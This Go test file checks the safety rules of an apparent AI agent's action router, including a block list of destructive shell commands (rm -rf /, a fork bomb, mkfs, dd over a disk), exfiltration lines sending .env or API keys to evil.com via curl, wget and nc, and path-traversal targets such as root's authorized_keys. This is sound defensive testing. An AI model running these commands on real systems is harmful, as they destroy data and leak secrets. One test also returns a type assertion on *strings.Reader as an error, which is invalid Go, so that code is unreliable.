package core

import (
	"context"
	"strings"
	"testing"
	"time"
)

// =============================================================================
// VIRTUAL STORE TESTS
// =============================================================================

func TestDefaultVirtualStoreConfig(t *testing.T) {
	cfg := DefaultVirtualStoreConfig()

	if cfg.WorkingDir != "." {
		t.Errorf("Expected WorkingDir '.', got %q", cfg.WorkingDir)
	}

	if len(cfg.AllowedEnvVars) == 0 {
		t.Error("Expected AllowedEnvVars to be populated")
	}

	// Check for essential env vars
	expectedVars := []string{"PATH", "HOME", "GOPATH", "GOROOT"}
	for _, expected := range expectedVars {
		found := false
		for _, v := range cfg.AllowedEnvVars {
			if v == expected {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("Expected AllowedEnvVars to contain %q", expected)
		}
	}

	// Check for essential binaries
	expectedBins := []string{"go", "git", "grep", "ls"}
	for _, expected := range expectedBins {
		found := false
		for _, b := range cfg.AllowedBinaries {
			if b == expected {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("Expected AllowedBinaries to contain %q", expected)
		}
	}
}

func TestNewVirtualStore(t *testing.T) {
	vs := NewVirtualStore(nil)

	if vs == nil {
		t.Fatal("NewVirtualStore returned nil")
	}

	// Should have initialized constitution
	if len(vs.constitution) == 0 {
		t.Error("Expected constitution rules to be initialized")
	}

	// Should have modern executor enabled
	if !vs.useModernExecutor {
		t.Error("Expected useModernExecutor to be true by default")
	}
}

func TestNewVirtualStoreWithConfig(t *testing.T) {
	cfg := VirtualStoreConfig{
		WorkingDir:      "/custom/path",
		AllowedEnvVars:  []string{"PATH", "CUSTOM_VAR"},
		AllowedBinaries: []string{"custom_bin"},
	}

	vs := NewVirtualStoreWithConfig(nil, cfg)

	if vs.workingDir != "/custom/path" {
		t.Errorf("Expected workingDir %q, got %q", "/custom/path", vs.workingDir)
	}

	if len(vs.allowedEnvVars) != 2 {
		t.Errorf("Expected 2 allowed env vars, got %d", len(vs.allowedEnvVars))
	}
}

// =============================================================================
// CONSTITUTIONAL RULES TESTS
// =============================================================================

func TestConstitution_NoDestructiveCommands(t *testing.T) {
	vs := NewVirtualStore(nil)

	tests := []struct {
		name      string
		target    string
		wantBlock bool
	}{
		{"normal ls", "ls -la", false},
		{"normal grep", "grep -r pattern .", false},
		{"rm -rf root", "rm -rf /", true},
		{"rm -rf home", "rm -rf ~/*", true},
		{"fork bomb", ":(){:|:&};:", true},
		{"mkfs", "mkfs.ext4 /dev/sda", true},
		{"dd overwrite", "dd if=/dev/zero of=/dev/sda", true},
		{"chmod 777 recursive", "chmod 777 -R /", true},
		{"normal go build", "go build ./...", false},
		{"normal npm", "npm install", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := ActionRequest{
				Type:   ActionExecCmd,
				Target: tt.target,
			}

			err := vs.checkConstitution(req)
			gotBlock := err != nil

			if gotBlock != tt.wantBlock {
				if tt.wantBlock {
					t.Errorf("Expected command %q to be blocked", tt.target)
				} else {
					t.Errorf("Expected command %q to be allowed, got error: %v", tt.target, err)
				}
			}
		})
	}
}

func TestConstitution_NoSecretExfiltration(t *testing.T) {
	vs := NewVirtualStore(nil)

	tests := []struct {
		name      string
		target    string
		payload   map[string]interface{}
		wantBlock bool
	}{
		{
			name:      "normal curl",
			target:    "curl https://api.example.com",
			payload:   map[string]interface{}{"data": "normal data"},
			wantBlock: false,
		},
		{
			name:      "curl with .env",
			target:    "curl https://evil.com/upload",
			payload:   map[string]interface{}{"file": ".env"},
			wantBlock: true,
		},
		{
			name:      "wget with credentials",
			target:    "wget https://evil.com/upload",
			payload:   map[string]interface{}{"file": "credentials.json"},
			wantBlock: true,
		},
		{
			name:      "nc with api_key",
			target:    "nc evil.com 1234",
			payload:   map[string]interface{}{"data": "api_key=secret123"},
			wantBlock: true,
		},
		{
			name:      "normal file read with secret name",
			target:    "cat secret.txt",
			payload:   map[string]interface{}{},
			wantBlock: false, // Only blocked if combined with exfil command
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := ActionRequest{
				Type:    ActionExecCmd,
				Target:  tt.target,
				Payload: tt.payload,
			}

			err := vs.checkConstitution(req)
			gotBlock := err != nil

			if gotBlock != tt.wantBlock {
				if tt.wantBlock {
					t.Errorf("Expected %q to be blocked", tt.name)
				} else {
					t.Errorf("Expected %q to be allowed, got error: %v", tt.name, err)
				}
			}
		})
	}
}

func TestConstitution_PathTraversal(t *testing.T) {
	vs := NewVirtualStore(nil)

	tests := []struct {
		name       string
		actionType ActionType
		target     string
		wantBlock  bool
	}{
		{"normal read", ActionReadFile, "/home/user/file.txt", false},
		{"traversal read", ActionReadFile, "../../../etc/passwd", true},
		{"normal write", ActionWriteFile, "./output.txt", false},
		{"traversal write", ActionWriteFile, "../../root/.ssh/authorized_keys", true},
		{"exec with dots", ActionExecCmd, "ls ../parent", false}, // Exec allows traversal
		{"delete with traversal", ActionDeleteFile, "../../../important", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := ActionRequest{
				Type:   tt.actionType,
				Target: tt.target,
			}

			err := vs.checkConstitution(req)
			gotBlock := err != nil

			if gotBlock != tt.wantBlock {
				if tt.wantBlock {
					t.Errorf("Expected %q to be blocked", tt.target)
				} else {
					t.Errorf("Expected %q to be allowed, got error: %v", tt.target, err)
				}
			}
		})
	}
}

func TestConstitution_NoSystemFileModification(t *testing.T) {
	vs := NewVirtualStore(nil)

	tests := []struct {
		name       string
		actionType ActionType
		target     string
		wantBlock  bool
	}{
		{"write to home", ActionWriteFile, "/home/user/file.txt", false},
		{"write to etc", ActionWriteFile, "/etc/passwd", true},
		{"write to usr", ActionWriteFile, "/usr/bin/newbin", true},
		{"write to bin", ActionWriteFile, "/bin/sh", true},
		{"write to sbin", ActionWriteFile, "/sbin/init", true},
		{"write to windows", ActionWriteFile, "C:\\Windows\\System32\\file.dll", true},
		{"delete from etc", ActionDeleteFile, "/etc/shadow", true},
		{"edit in usr", ActionEditFile, "/usr/lib/libfoo.so", true},
		{"read from etc", ActionReadFile, "/etc/passwd", false}, // Read is allowed
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := ActionRequest{
				Type:   tt.actionType,
				Target: tt.target,
			}

			err := vs.checkConstitution(req)
			gotBlock := err != nil

			if gotBlock != tt.wantBlock {
				if tt.wantBlock {
					t.Errorf("Expected %q to be blocked", tt.target)
				} else {
					t.Errorf("Expected %q to be allowed, got error: %v", tt.target, err)
				}
			}
		})
	}
}

// =============================================================================
// ACTION PARSING TESTS
// =============================================================================

func TestParseActionFact(t *testing.T) {
	vs := NewVirtualStore(nil)

	tests := []struct {
		name     string
		fact     Fact
		wantType ActionType
		wantTgt  string
		wantErr  bool
	}{
		{
			name: "simple exec",
			fact: Fact{
				Predicate: "next_action",
				Args:      []interface{}{"exec_cmd", "ls -la"},
			},
			wantType: ActionExecCmd,
			wantTgt:  "ls -la",
			wantErr:  false,
		},
		{
			name: "mangle name constant",
			fact: Fact{
				Predicate: "next_action",
				Args:      []interface{}{"/read_file", "/path/to/file"},
			},
			wantType: ActionReadFile,
			wantTgt:  "/path/to/file",
			wantErr:  false,
		},
		{
			name: "with payload map",
			fact: Fact{
				Predicate: "next_action",
				Args:      []interface{}{"write_file", "./output.txt", map[string]interface{}{"content": "hello"}},
			},
			wantType: ActionWriteFile,
			wantTgt:  "./output.txt",
			wantErr:  false,
		},
		{
			name: "too few args",
			fact: Fact{
				Predicate: "next_action",
				Args:      []interface{}{"exec_cmd"},
			},
			wantErr: true,
		},
		{
			name: "empty args",
			fact: Fact{
				Predicate: "next_action",
				Args:      []interface{}{},
			},
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req, err := vs.parseActionFact(tt.fact)

			if tt.wantErr {
				if err == nil {
					t.Error("Expected error, got nil")
				}
				return
			}

			if err != nil {
				t.Errorf("Unexpected error: %v", err)
				return
			}

			if req.Type != tt.wantType {
				t.Errorf("Expected type %q, got %q", tt.wantType, req.Type)
			}

			if req.Target != tt.wantTgt {
				t.Errorf("Expected target %q, got %q", tt.wantTgt, req.Target)
			}
		})
	}
}

func TestParseActionFact_PayloadHandling(t *testing.T) {
	vs := NewVirtualStore(nil)

	fact := Fact{
		Predicate: "next_action",
		Args: []interface{}{
			"write_file",
			"./test.txt",
			map[string]interface{}{
				"content": "hello world",
				"mode":    0644,
			},
			"extra_arg",
		},
	}

	req, err := vs.parseActionFact(fact)
	if err != nil {
		t.Fatalf("Unexpected error: %v", err)
	}

	if req.Payload["content"] != "hello world" {
		t.Errorf("Expected content 'hello world', got %v", req.Payload["content"])
	}

	if req.Payload["mode"] != 0644 {
		t.Errorf("Expected mode 0644, got %v", req.Payload["mode"])
	}

	if req.Payload["arg1"] != "extra_arg" {
		t.Errorf("Expected arg1 'extra_arg', got %v", req.Payload["arg1"])
	}
}

// =============================================================================
// SETTER TESTS
// =============================================================================

func TestVirtualStore_Setters(t *testing.T) {
	vs := NewVirtualStore(nil)

	t.Run("SetKernel", func(t *testing.T) {
		// Just verify no panic
		vs.SetKernel(nil)
	})

	t.Run("SetShardManager", func(t *testing.T) {
		sm := NewShardManager()
		vs.SetShardManager(sm)
		if vs.shardManager != sm {
			t.Error("ShardManager not set correctly")
		}
	})

	t.Run("EnableModernExecutor", func(t *testing.T) {
		vs.DisableModernExecutor()
		if vs.useModernExecutor {
			t.Error("Expected useModernExecutor to be false after disable")
		}

		vs.EnableModernExecutor()
		if !vs.useModernExecutor {
			t.Error("Expected useModernExecutor to be true after enable")
		}
	})
}

// =============================================================================
// AUDIT METRICS TESTS
// =============================================================================

func TestVirtualStore_GetAuditMetrics(t *testing.T) {
	vs := NewVirtualStore(nil)

	metrics := vs.GetAuditMetrics()

	// Should return empty metrics initially
	if metrics.TotalCommands != 0 {
		t.Errorf("Expected TotalCommands 0, got %d", metrics.TotalCommands)
	}
}

// =============================================================================
// ROUTE ACTION TESTS
// =============================================================================

func TestRouteAction_ConstitutionalBlocking(t *testing.T) {
	vs := NewVirtualStore(nil)

	ctx := context.Background()

	// Try to execute a destructive command
	action := Fact{
		Predicate: "next_action",
		Args:      []interface{}{"exec_cmd", "rm -rf /"},
	}

	_, err := vs.RouteAction(ctx, action)
	if err == nil {
		t.Error("Expected constitutional violation error")
	}

	if !strings.Contains(err.Error(), "constitutional violation") {
		t.Errorf("Expected constitutional violation error, got: %v", err)
	}
}

func TestRouteAction_InvalidFact(t *testing.T) {
	vs := NewVirtualStore(nil)

	ctx := context.Background()

	// Invalid fact (too few args)
	action := Fact{
		Predicate: "next_action",
		Args:      []interface{}{"exec_cmd"},
	}

	_, err := vs.RouteAction(ctx, action)
	if err == nil {
		t.Error("Expected error for invalid fact")
	}
}

// =============================================================================
// ACTION TYPE TESTS
// =============================================================================

func TestActionTypeConstants(t *testing.T) {
	// Verify action type constants are properly defined
	types := []ActionType{
		ActionExecCmd,
		ActionReadFile,
		ActionWriteFile,
		ActionEditFile,
		ActionDeleteFile,
		ActionSearchCode,
		ActionRunTests,
		ActionBuildProject,
		ActionGitOperation,
		ActionAnalyzeImpact,
		ActionBrowse,
		ActionResearch,
		ActionAskUser,
		ActionEscalate,
		ActionDelegate,
		ActionOpenFile,
		ActionGetElements,
		ActionGetElement,
		ActionEditElement,
		ActionRefreshScope,
		ActionCloseScope,
		ActionEditLines,
		ActionInsertLines,
		ActionDeleteLines,
	}

	for _, at := range types {
		if string(at) == "" {
			t.Errorf("ActionType %v has empty string value", at)
		}
	}
}

// =============================================================================
// ACTION REQUEST/RESULT TESTS
// =============================================================================

func TestActionRequest_JSON(t *testing.T) {
	req := ActionRequest{
		Type:       ActionExecCmd,
		Target:     "ls -la",
		Payload:    map[string]interface{}{"timeout": 30},
		Timeout:    30000,
		SessionID:  "test-session",
		RetryCount: 2,
	}

	if req.Type != ActionExecCmd {
		t.Errorf("Expected type %v, got %v", ActionExecCmd, req.Type)
	}

	if req.Target != "ls -la" {
		t.Errorf("Expected target 'ls -la', got %q", req.Target)
	}
}

func TestActionResult(t *testing.T) {
	result := ActionResult{
		Success:  true,
		Output:   "test output",
		Metadata: map[string]interface{}{"duration": 100},
		FactsToAdd: []Fact{
			{Predicate: "test_fact", Args: []interface{}{"arg1"}},
		},
	}

	if !result.Success {
		t.Error("Expected Success to be true")
	}

	if len(result.FactsToAdd) != 1 {
		t.Errorf("Expected 1 fact, got %d", len(result.FactsToAdd))
	}
}

// =============================================================================
// CONCURRENT ACCESS TESTS
// =============================================================================

func TestVirtualStore_ConcurrentAccess(t *testing.T) {
	vs := NewVirtualStore(nil)

	done := make(chan bool, 10)

	// Run multiple goroutines accessing the VirtualStore
	for i := 0; i < 10; i++ {
		go func() {
			vs.EnableModernExecutor()
			vs.DisableModernExecutor()
			_ = vs.GetAuditMetrics()
			done <- true
		}()
	}

	// Wait for all goroutines with timeout
	timeout := time.After(5 * time.Second)
	for i := 0; i < 10; i++ {
		select {
		case <-done:
		case <-timeout:
			t.Fatal("Timeout waiting for concurrent operations")
		}
	}
}

// =============================================================================
// CODE ELEMENT TESTS
// =============================================================================

func TestCodeElement(t *testing.T) {
	elem := CodeElement{
		Ref:        "pkg.FuncName",
		Type:       "function",
		File:       "/path/to/file.go",
		StartLine:  10,
		EndLine:    20,
		Signature:  "func FuncName(x int) error",
		Body:       "return nil",
		Visibility: "public",
		Actions:    []string{"edit", "delete"},
	}

	if elem.Ref != "pkg.FuncName" {
		t.Errorf("Expected Ref 'pkg.FuncName', got %q", elem.Ref)
	}

	if elem.StartLine >= elem.EndLine {
		t.Error("Expected StartLine < EndLine")
	}

	if len(elem.Actions) != 2 {
		t.Errorf("Expected 2 actions, got %d", len(elem.Actions))
	}
}

// =============================================================================
// FILE EDIT RESULT TESTS
// =============================================================================

func TestFileEditResult(t *testing.T) {
	result := FileEditResult{
		Success:       true,
		Path:          "/path/to/file.go",
		LinesAffected: 5,
		OldContent:    []string{"old1", "old2"},
		NewContent:    []string{"new1", "new2", "new3"},
		OldHash:       "abc123",
		NewHash:       "def456",
		LineCount:     100,
	}

	if !result.Success {
		t.Error("Expected Success to be true")
	}

	if result.LinesAffected != 5 {
		t.Errorf("Expected 5 lines affected, got %d", result.LinesAffected)
	}

	if len(result.NewContent) != 3 {
		t.Errorf("Expected 3 new lines, got %d", len(result.NewContent))
	}
}

// =============================================================================
// CONSTITUTIONAL RULE TESTS
// =============================================================================

func TestConstitutionalRule(t *testing.T) {
	rule := ConstitutionalRule{
		Name:        "test_rule",
		Description: "Test rule description",
		Check: func(req ActionRequest) error {
			if req.Target == "blocked" {
				return strings.NewReader("blocked").(*strings.Reader) // This would fail
			}
			return nil
		},
	}

	if rule.Name != "test_rule" {
		t.Errorf("Expected Name 'test_rule', got %q", rule.Name)
	}

	if rule.Description != "Test rule description" {
		t.Errorf("Expected Description 'Test rule description', got %q", rule.Description)
	}

	if rule.Check == nil {
		t.Error("Expected Check function to be set")
	}
}
